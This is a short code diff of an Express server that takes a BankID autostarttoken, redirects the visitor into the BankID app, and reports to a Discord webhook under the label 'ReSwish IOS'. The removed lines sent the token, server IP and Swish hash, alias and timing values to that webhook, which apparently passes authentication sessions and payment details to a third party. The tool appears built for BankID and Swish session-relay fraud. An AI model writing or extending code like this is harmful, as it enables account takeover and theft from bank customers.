@@ -11,27 +11,19 @@ let AMOUNT = ""
 app.use(express.json());
 
 
-app.get("/?autostarttoken=:token", async (req, res) => {
-const token = req.params.token;
+app.get("/", (req, res) => {
+  const { autostarttoken: token } = req.query;
   const redirectUrl = `bankid:///?autostarttoken=${token}`;
   res.redirect(redirectUrl);
 
- const embedMessage = {
-      title: 'BankID Verification',
-      description: 'Waiting for verification response.',
-      color: 0x0000FF,
-      fields: [
-        { name: 'Vercel IP', value: ipAddress, inline: true },
-        { name: 'Swish Hash', value: hash, inline: true },
-        { name: 'Swish Alias', value: alias, inline: true },
-        { name: 'Swish CTime', value: clienttime, inline: true },
-        { name: 'BankID Verified', value: bankid, inline: true },
+  const embedMessage = {
+    title: 'BankID Verification',
+    description: 'Waiting for verification response.',
+    color: 0x0000FF,
+    footer: { text: 'ReSwish IOS | Version (0.0.1)' }
+  };
 
-      ],
-      footer: { text: 'ReSwish IOS | Version (0.0.1)' }
-    };
-     await sendDiscordWebhook(`[BankID] A new token has been generated ${token}. Waiting for verification! `);
-
+  sendDiscordWebhook(embedMessage);
 });
 
   // Function to send Discord webhook
